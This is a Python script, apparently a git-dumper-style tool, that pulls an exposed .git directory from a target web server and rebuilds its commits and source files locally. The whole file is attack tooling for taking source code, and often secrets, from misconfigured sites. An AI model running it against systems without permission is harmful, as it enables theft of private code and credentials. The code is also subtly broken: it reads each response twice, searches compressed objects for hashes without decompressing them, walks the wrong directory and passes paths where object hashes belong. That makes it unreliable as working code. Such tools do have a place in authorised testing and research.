import os
import re
import urllib.request
from urllib.parse import urljoin
from urllib.error import URLError, HTTPError
import subprocess
import sys
import warnings

warnings.filterwarnings('ignore')

def get_git_dir():
    for arg in sys.argv:
        if arg.startswith("--git-dir="):
            return arg.split("=")[1]
    return ".git"


def traverse_tree(tree, path):
    result = subprocess.run(["git", "ls-tree", tree], capture_output=True, text=True)
    if result.returncode != 0:
        return

    for leaf in result.stdout.splitlines():
        type, _, hash, name = leaf.split(maxsplit=3)
        hash = hash.strip()
        name = name.strip()

        if type == "blob":
            print(f"[+] Found file: {path}/{name}")
            subprocess.run(["git", "cat-file", "-p", hash], capture_output=True, text=True, check=True, stdout=open(f"{path}/{name}", "w"))
        else:
            print(f"[+] Found folder: {path}/{name}")
            os.makedirs(f"{path}/{name}", exist_ok=True)
            traverse_tree(hash, f"{path}/{name}")

def traverse_commit(base, commit, count):
    print(f"[+] Found commit: {commit}")
    path = os.path.join(base, f"{count}-{commit}")
    os.makedirs(path, exist_ok=True)
    subprocess.run(["git", "cat-file", "-p", commit], capture_output=True, text=True, check=True, stdout=open(f"{path}/commit-meta.txt", "w"))
    traverse_tree(commit, path)

def main():
    BASE_DIR = sys.argv[1].replace("http://", "").replace("https://", "").replace("/", "").replace(".", "")
    GIT_DIR = ".git"
    BASE_GIT_DIR = os.path.join(BASE_DIR, GIT_DIR)
    
    base_url = sys.argv[1]
    git_dir = get_git_dir()

    if not base_url.endswith("/"):
        base_url += "/"

    if git_dir not in base_url:
        print(f"[-] /{git_dir}/ missing in URL")
        sys.exit(0)

    if not os.path.exists(BASE_GIT_DIR):
        print("[*] Destination folder does not exist, creating")
        os.makedirs(BASE_GIT_DIR)

    downloaded_files = set()

    queue = [
        'HEAD', 'objects/info/packs', 'description', 'config', 'COMMIT_EDITMSG',
        'index', 'packed-refs', 'refs/heads/master', 'refs/remotes/origin/HEAD',
        'refs/stash', 'logs/HEAD', 'logs/refs/heads/master', 'logs/refs/remotes/origin/HEAD',
        'info/refs', 'info/exclude', '/refs/wip/index/refs/heads/master', '/refs/wip/wtree/refs/heads/master'
    ]

    while queue:
        objname = queue.pop(0)
        target = os.path.join(BASE_GIT_DIR, objname)

        if target in downloaded_files:
            print(f"[+] File already exists: {objname}")
            continue
        else:
            url = urljoin(base_url.rstrip('/'), objname)  
            print(f"[*] Downloading: {url}")

            try:
                response = urllib.request.urlopen(url, timeout=10)
                if response.status == 200:
                    if not os.path.exists(os.path.dirname(target)):
                        os.makedirs(os.path.dirname(target))
                    with open(target, 'wb') as f:
                        f.write(response.read())
                    print(f"[+] Downloaded: {objname}")
                    downloaded_files.add(target)
                    if objname.startswith("objects/"):  
                        hashes = re.findall(r'[a-f0-9]{40}', response.read().decode())
                        for h in hashes:
                            queue.append(f"objects/{h[:2]}/{h[2:]}")
            except (URLError, HTTPError) as e:
                continue

    print("[*] Done downloading files")

    print("checking if .git folder exists")

    if not os.path.exists(git_dir):
        print("[-] There's no .git folder")
        sys.exit(1)
    print("[+] .git folder found at: " + git_dir)
    print("[*] Extracting commits")

    if not os.path.exists(BASE_DIR + "_extracted"):
        print("[*] Destination folder does not exist, creating")
        os.makedirs(BASE_DIR + "_extracted")

    commit_count = 0

    old_dir = os.getcwd()
    target_dir = os.path.abspath(BASE_DIR + "_extracted")  

    os.chdir(BASE_GIT_DIR)

    for root, _, files in os.walk(".git/objects"):
        for file in files:
            object_path = os.path.join(root, file)
            result = subprocess.run(["git", "cat-file", "-t", object_path], capture_output=True, text=True)
            if result.returncode != 0:
                continue

            if result.stdout.strip() == "commit":
                traverse_commit(target_dir, object_path, commit_count)
                print(f"[+] Found commit: {object_path}")
                commit_count += 1

    os.chdir(old_dir)
    print(f"[+] Extracted {commit_count} commits")
    print("[+] Done!")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("[*] USAGE: http://target.tld/.git/")
        sys.exit(1)
    main()
